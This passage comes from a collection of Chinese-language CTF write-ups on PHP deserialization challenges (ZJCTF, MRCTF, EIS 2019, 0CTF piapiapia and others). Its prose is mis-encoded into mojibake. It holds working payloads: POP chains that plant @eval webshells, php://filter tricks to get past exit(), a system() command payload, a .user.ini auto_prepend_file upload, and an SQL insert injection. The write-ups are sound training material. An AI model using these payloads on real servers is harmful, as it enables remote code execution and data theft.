preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; æ ¹æ®æç¤ºæŸ¥çœ‹phpinfo ç›´æ¥è®¿é—®d0g3_f1ag.phpæ²¡æœ‰å›æ˜¾ã€‚ TODO [ZJCTF2019]NiZhuanSiWei è€ƒç‚¹ ä»£ç å®¡è®¡ æ–‡ä»¶åŒ…å« PHPååºåˆ—åŒ– è§£é¢˜ ç›´æ¥ç»™å‡ºæºç ï¼š 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; file_get_contentsç»•è¿‡ æœ‰ä¸¤ç§æ–¹å¼ç»•è¿‡ï¼š ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡ â‘  å°†è¦GETçš„å‚æ•°?xxx=php://input â‘¡ ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼ ç”¨data://ä¼ªåè®®ç»•è¿‡ å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64ï¼Œæƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç  æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹) 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; è¯»å–useless.php é¢˜ç›®æœ‰ç¬¬äºŒä¸ªå‚æ•°fileï¼Œå¤§æ¦‚æ˜¯include()è¿™ä¸ªfileï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬è¦åŒ…å«useless.phpï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªåˆ¤æ–­æ˜¯fileå‚æ•°ä¸èƒ½ä¼ å…¥flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.phpã€‚ åˆ©ç”¨php://filteråè®®è¯»å–è¿™ä¸ªuseless.phpï¼Œæ„é€ payloadè¯»å–useless.phpï¼š 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php useless.php 123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;HAHAHAHAHA&quot;); &#125; &#125; &#125; ååºåˆ—åŒ– useless.phpçš„é­”æœ¯æ–¹æ³•æ˜¯__toString()ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨echo $passwordè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚ ç”Ÿæˆpayloadï¼š 123456class Flag&#123; public $file = &quot;flag.php&quot;;&#125;$o = new Flag();$s = serialize($o);echo $s; payloadï¼š 1?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; ç»¼åˆèµ·æ¥çš„payloadå°±æ˜¯ï¼š 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; [MRCTF2020]Ezpop è€ƒç‚¹ POPé“¾æ„é€  è§£é¢˜ 123456789101112131415161718192021&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $p;&#125;$s = new Show();$t = new Test();$m = new Modifier();$t-&gt;p = $m;$s-&gt;source = $s;$s-&gt;str = $t;echo urlencode(serialize($s)); [EIS 2019]EzPOP è€ƒç‚¹ POPé“¾æ„é€  php://filter ç»•è¿‡exit() base64ç¼–ç è§„åˆ™ è§£é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // åˆ›å»ºå¤±è´¥ &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); é¢˜ç›®æç¤ºçš„å¾ˆæ˜æ˜¾ï¼Œéœ€è¦æ„é€ ä¸€ä¸ªPOPé“¾ï¼Œèƒ½åˆ©ç”¨çš„é­”æ³•å‡½æ•°åªæœ‰ A::__destruct()ï¼Œå¯èƒ½å¯ä»¥åˆ©ç”¨çš„æ•æ„Ÿå‡½æ•°ï¼šB ç±» set() ä¸­çš„ file_put_contents()ã€‚å…ˆåˆ†æä¸€ä¸‹ file_put_contents() å‡½æ•°æ˜¯å¦æ»¡è¶³åˆ©ç”¨æ¡ä»¶ï¼š 12$data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;$result = file_put_contents($filename, $data); åœ¨ exit() ä»£ç åé¢æ‹¼æ¥ $data æ•°æ®ï¼Œç„¶åå†™å…¥æ–‡ä»¶ã€‚è¿™æ ·å°±ä¼šå¯¼è‡´æˆ‘ä»¬é€šè¿‡$dataå†™å…¥çš„shlléƒ½ä¸ä¼šè¢«æ‰§è¡Œã€‚ exit()å‡½æ•°å¯ä»¥åˆ©ç”¨base64_decodeä»¥åŠphp://filterå¯ä»¥ç»•è¿‡ã€‚ è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ è¿™é‡Œæ€è·¯æ˜¯åˆ©ç”¨ php://filter æä¾›çš„å„ç§å‡½æ•°å»é™¤ â€œæ­»äº¡exitâ€ã€‚ æ¥ä¸‹æ¥å¼€å§‹å¯»æ‰¾ POP é“¾ æ¥ä¸‹æ¥å›æº¯çœ‹$filenameå’Œ``$data`æ˜¯æ€ä¹ˆæ¥çš„ï¼š $filenameï¼šå…ˆè°ƒç”¨getCacheKey($name)ï¼Œæ”¹æ–¹æ³•æ˜¯æ‰§è¡Œè¿æ¥å­—ç¬¦ä¸²çš„ä½œç”¨ï¼š$this-&gt;option['prefix'].$nameæ„æˆfilenameã€‚ $dataï¼šæ¥è‡ªäº $this-&gt;serialize($value)ï¼Œæ‰€ä»¥å†å…³æ³¨$valueæ˜¯æ€ä¹ˆæ¥çš„ã€‚$valueæ˜¯A::getForStorage()çš„è¿”å›å€¼ï¼šjson_encode([A::cleanContents(A::cache), A::complete]);ã€‚ A::cleanContents(A::cache)å®ç°äº†ä¸€ä¸ªè¿‡æ»¤çš„åŠŸèƒ½ï¼ŒA::completeæ›´å®¹æ˜“æ§åˆ¶ï¼Œç›´æ¥å†™ä¸ºshellcodeã€‚ å…¶ä¸­cleanContents(): 1234567891011121314public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents;&#125; å°è¯•æœ¬åœ°è¿è¡Œï¼š 123456789101112131415161718&lt;?phpfunction cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents;&#125;$cache=array();$complete=&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;;echo json_encode([cleanContents($cache), $complete]); å¾—åˆ°ï¼š 1[[],&quot;&lt;?php @eval($_POST[\\&quot;a\\&quot;]);?&gt;&quot;] å¯ä»¥çœ‹åˆ°ç›´æ¥completeå†™å…¥shellä¼šä½¿shellä¸­åŒå¼•å·è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å¾—è€ƒè™‘ç”¨base64ç¼–ç ç»•è¿‡è½¬ä¹‰ï¼Œå†åœ¨ä¹‹åè§£ç ã€‚ç”±äºä¹‹åå¯ä»¥è®©$this-&gt;options['serialize']=base64.decodeï¼Œè¿™æ ·å’Œfilter://å°±å…±æœ‰ä¸¤å¤„è§£ç å¤„ç†ï¼Œæ‰€ä»¥å¯¹åº”è¿™é‡Œè€ƒè™‘ç¼–ç ä¸¤æ¬¡ã€‚ æœ€ç»ˆä»£ç ï¼š 12345678910111213141516171819202122232425262728293031&lt;?phpclass A &#123; protected $store; protected $key; protected $expire; public function __construct($store,$key,$expire) &#123; $this-&gt;key=$key; $this-&gt;expire=$expire; $this-&gt;store=$store; &#125;&#125;class B&#123; public $option;&#125;$b=new B();$b-&gt;options[&#x27;serialize&#x27;]=&#x27;base64_decode&#x27;;$b-&gt;options[&#x27;data_compress&#x27;]=false;$b-&gt;options[&#x27;prefix&#x27;]=&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;;$a=new A($b,&#x27;eval.php&#x27;,0);$a-&gt;autosave=false;$a-&gt;cache=array();$a-&gt;complete=base64_encode(&#x27;abc&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;));//å¿…é¡»æ·»åŠ ä¸‰ä¸ªå­—ç¬¦ä½¿å¾—shellä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç æ—¶ä¸å½±å“åˆ°shellecho urlencode(serialize($a)); è¿™é‡Œè¿˜è¦äº†è§£base64è§£ç ç‰¹ç‚¹ï¼Œbase64è§£ç çš„åˆæ³•å­—ç¬¦åªåŒ…æ‹¬[a-zA-Z1-9]+/è¿™64ä¸ªå­—ç¬¦ã€‚ ç¼–ç æ—¶ï¼šæŠŠæ˜æ–‡æ¯8ä½æŒ‰6ä½æŸ¥è¡¨è½¬ç ï¼Œä¸è¶³çš„ä½æ•°ç”¨=è¡¥0 è§£ç æ—¶ï¼šå¿½ç•¥[&quot;,:ç­‰64ä¸ªå­—ç¬¦ä¹‹å¤–çš„å­—ç¬¦ï¼Œç„¶åé€†è¿ç®—å°±è¡Œ æ‰€ä»¥è¦æ±‚ç¼–ç ä¸º4çš„å€æ•°ï¼Œç”±äºshellå‰é¢çš„å­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„base64ç¼–ç æœ‰æ•ˆå­—ç¬¦åªæœ‰php//000000000000exit21ä¸ªå­—ç¬¦ï¼Œå› æ­¤åº”è¯¥åœ¨shellå‰è¡¥ä¸Š3ä¸ªæœ‰æ•ˆå­—ç¬¦ã€‚ [2020 æ–°æ˜¥çº¢åŒ…é¢˜] å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œåœ¨æ–‡ä»¶åé‚£é‡Œåšäº†ä¸¤ä¸ªå¤„ç†ï¼Œä¸€æ˜¯æ–‡ä»¶ååŒ…å«éšæœºå­—ç¬¦ï¼Œç¬¬äºŒç‚¹æ˜¯é™åˆ¶äº†.phpåç¼€ã€‚ è§£æ³•1 ç›´æ¥å†™å‘½ä»¤ï¼Œç”Ÿæˆflagæ–‡ä»¶ã€‚ å‚è§å®‰å…¨å®¢æ–‡ç« :https://www.anquanke.com/post/id/194036 123456$testB = new B();$testB-&gt;options[&#x27;serialize&#x27;] = &#x27;system&#x27;;$testA = new A($testB, &quot;miao&quot;);$testA-&gt;autosave = 0;$testA-&gt;cache = [&#x27;aaq&#x27; =&gt; &#x27;`cat /flag &gt; ./flag.xml`&#x27;];echo urlencode(serialize($testA)).&quot;\\n&quot;; é¦–å…ˆautosaveè¦ä¸º0ï¼Œ$testB-&gt;options['serialize']è¦ä¸ºsystemå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹æœ€åçš„å†™æ–‡ä»¶æ²¡ä»€è«è¦æ±‚äº†ï¼Œä½†å¿…é¡»è¦æ‰§è¡Œåˆ°$data = $this-&gt;serialize($value);è¿™æ­¥ï¼Œ$testA-&gt;cacheè¦ä¸ºsystemè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ è§£æ³•2 å¯¹äºå‰é¢çš„éšæœºå€¼ï¼Œä½¿ç”¨/â€¦/å³å¯æˆªæ–­ï¼Œæ—¶é—´æˆ³å°†ä¼šè¢«è®¤ä¸ºä¸€ä¸ªç›®å½•ï¼Œåé¢å³å¯è¿½åŠ å†™ä»»æ„æ–‡ä»¶ã€‚ 123456789$b = new B();$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;);$a = new A($store = $b, $key = &quot;/../a.php/.&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); è§£æ³•3 å…ˆå¯ä»¥åˆ©ç”¨è·¨ç›®å½•ï¼Œè¿™æ ·å°±å¯ä»¥ä¸å»çˆ†ç ´æ–‡ä»¶åï¼Œå†åˆ©ç”¨.user.iniç»•è¿‡åç¼€åé™åˆ¶ã€‚ ä¸Šä¼ å›¾ç‰‡é©¬ 123456789101112$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../aaaaaa.jpg&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); å†ä¸Šä¼ .user.ini 123456789101112$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../.user.ini&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&quot;\\nauto_prepend_file=aaaaaa.jpg&quot;));echo urlencode(serialize($a)); å‚è€ƒ http://althims.com/2020/01/29/buu-new-year/ moonback [å®‰æ´µæ¯2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼  è€ƒç‚¹ æºç æ³„éœ² insertæ³¨å…¥ PHPååºåˆ—åŒ– è§£é¢˜ åœ¨ä¸»é¡µçš„æºç ä¸‹æ–¹æœ‰ä¸€ä¸ªå¼€å‘äººå‘˜ç•™çš„ä¿¡æ¯ï¼šwowouploadimage, githubæœç´¢è¿™ä¸ªåç§°ï¼Œå³å¯æ‰¾åˆ°æºç ã€‚ å¤§æ¦‚å°±ä¸‰ä¸ªåŠŸèƒ½ï¼šä¸Šä¼ ã€æŸ¥çœ‹ã€åˆ é™¤ã€‚ æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ª__destruct()å‡½æ•°ï¼Œä»¥åŠfile_get_contentã€‚ 12345678910111213public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125; å†æ‰¾ååºåˆ—åŒ–è§¦å‘çš„ç‚¹ 12345678910111213141516public function Get_All_Images()&#123; $sql = &quot;SELECT * FROM images&quot;; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row[&quot;attr&quot;])&#123; $attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]); $attr = unserialize($attr_temp); &#125; echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;; &#125; &#125;else&#123; echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;; &#125; mysqli_close($this-&gt;con); &#125; ç¬¬14è¡Œååºåˆ—åŒ–çš„å€¼æ˜¯ä»æ•°æ®åº“ä¸­å–å‡ºçš„ï¼Œè€Œåºåˆ—åŒ–çš„å€¼æ˜¯å›¾ç‰‡çš„é•¿å®½ï¼Œä¸å¯æ§ï¼Œå› æ­¤åªèƒ½å°è¯•SQLæ³¨å…¥å°†attrå±æ€§æ›¿æ¢æ‰ã€‚ 123456789101112131415161718192021public function insert_array($data) &#123; $con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($con)) &#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $key); $value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $value); $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;; $sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;; &#125; $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; filenameå­—æ®µç›´æ¥å¯æ§ï¼Œå¯ä»¥åœ¨ä¸Šä¼ å›¾ç‰‡æ—¶ä¿®æ”¹filenameå®ç°æ³¨å…¥ã€‚ å…ˆç”Ÿæˆpayloadï¼š 1234567891011&lt;?php class helper&#123; protected $ifview = true; protected $config = &quot;/flag&quot;;&#125; $a = new helper();echo serialize($a);?&gt; payloadï¼š 1O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125; ç”±äºå­˜åœ¨æ›¿æ¢ï¼š 1$attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]); æ‰€ä»¥æŠŠpayloadå˜ä¸ºï¼š 1O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\\0\\0\\0ifview&quot;;b:1;s:9:&quot;\\0\\0\\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125; å› ä¸ºä¸Šä¼ çš„æ–‡ä»¶åä¸­ä¸èƒ½æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥å°†payloadè¿›è¡Œ16è¿›åˆ¶ç¼–ç ã€‚ 10x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d åŸæ¥çš„æ’å…¥è¯­å¥ä¸º 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#x27;a&#x27;,&#x27;a.jpg&#x27;,&#x27;jpg&#x27;,&#x27;pic/a.jpg&#x27;,&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;) ä¼ å…¥titleçš„å€¼ï¼š 11&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg insertæ³¨å…¥å 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#x27;1.jpg&#x27;,&#x27;a.jpg&#x27;,&#x27;jpg&#x27;,&#x27;pic/a.jpg&#x27;,&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;) å®é™…ä¸Šæ’å…¥äº†ä¸¤æ¡æ•°æ®ï¼Œå–å‡ºçš„æ—¶å€™å°±ä¼šååºåˆ—åŒ–ä¼ å…¥çš„æ•°æ®ã€‚è®¿é—®show.phpå¾—åˆ°flagã€‚ [NPUCTF2020]ReadlezPHP è€ƒç‚¹ PHPååºåˆ—åŒ– è§£é¢˜ æ‰“å¼€é¢˜ç›®ç›´æ¥æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªtime.php?sourceï¼Œè®¿é—®å³å¾—åˆ°æºç  12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); æ¯”è¾ƒç®€å•çš„ååºåˆ—åŒ–é¢˜ç›®ï¼Œç”Ÿæˆpayload 1234567891011&lt;?phpclass HelloPhp&#123; public $a; public $b;&#125;$t = new HelloPhp;$t-&gt;a = &quot;phpinfo()&quot;;$t-&gt;b = &quot;assert&quot;;$ut = serialize($t);echo $ut; ç„¶åå…¨å±€æœç´¢flagã€‚ åè®° ä¸€å¼€å§‹æˆ‘ä½¿ç”¨evalå’Œphpinfo()æ— æ³•æ‰§è¡Œ ï¼ŒæŠ¥é”™evalå‡½æ•°æ²¡æœ‰å®šä¹‰ï¼Œå»StackOverflowä¸Šä¸€çœ‹ï¼Œè¯´æ˜¯evalä¸èƒ½ç”¨äºåŠ¨æ€å‡½æ•°ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼š evalæ˜¯å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚ ä»€ä¹ˆæ˜¯å¯å˜å‡½æ•°ï¼Ÿ å¯å˜å‡½æ•°å³å˜é‡ååŠ æ‹¬å·ï¼ŒPHPç³»ç»Ÿä¼šå°è¯•è§£ææˆå‡½æ•°ï¼Œå¦‚æœæœ‰å½“å‰å˜é‡ä¸­çš„å€¼ä¸ºå‘½åçš„å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨ã€‚å¦‚æœæ²¡æœ‰å°±æŠ¥é”™ã€‚ å¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireï¼Œeval() ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚ æ‰€ä»¥ï¼š evalæ˜¯è¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ åœ¨php7.1ç‰ˆæœ¬ä¹‹å assert()é»˜è®¤ä¸å†å¯ä»¥æ‰§è¡Œä»£ç  [0CTF2016]piapiapia è€ƒç‚¹ æ•°ç»„ç»•è¿‡ PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ è§£é¢˜ www.zipä¸‹è½½æºç ï¼Œä¸€å…±æœ‰6ä¸ªPHPæ–‡ä»¶ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±ä¸‹é¢è¿™å‡ ä¸ªæ–‡ä»¶ã€‚ å¾ˆæ˜æ˜¾flagåœ¨config.phpä¸­ 1234567&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; profile.php 1234567891011121314151617&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt; update.php 1234567891011121314151617181920212223242526272829303132&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login 